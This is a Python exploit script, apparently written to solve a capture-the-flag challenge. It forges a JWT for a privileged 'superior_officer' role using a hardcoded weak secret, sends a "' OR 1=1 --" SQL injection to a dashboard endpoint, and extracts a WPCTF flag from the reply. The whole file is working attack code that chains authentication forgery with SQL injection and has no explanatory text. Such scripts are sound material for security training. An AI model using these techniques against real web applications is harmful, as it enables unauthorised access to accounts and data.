#!/usr/bin/env python3
import argparse, sys, time, jwt, requests, urllib.parse, re

DEFAULT_SECRET = "secret_key_doesnt_matter"


def parse():
    p = argparse.ArgumentParser(description="Generate JWT and query dashboard")
    p.add_argument("host")
    p.add_argument("port")
    return p.parse_args()


def get_jwt():
    now = int(time.time())
    payload = {"username": "ShadowPulse", "role": "superior_officer", "iat": now, "exp": now + 3600}
    return jwt.encode(payload, DEFAULT_SECRET, algorithm="HS256")


def main():
    args = parse()
    token = get_jwt()
    q = "' OR 1=1 --"
    url = f"http://{args.host}:{args.port}/dashboard?q={urllib.parse.quote(q, safe='')}"
    try:
        r = requests.get(url, cookies={"token": token}, timeout=10)
        m = re.search(r"WPCTF\{.*?\}", r.text)
        if m:
            print(m.group(0))
        else:
            print("No flag", file=sys.stderr)
            return 1
    except Exception as e:
        print(str(e), file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
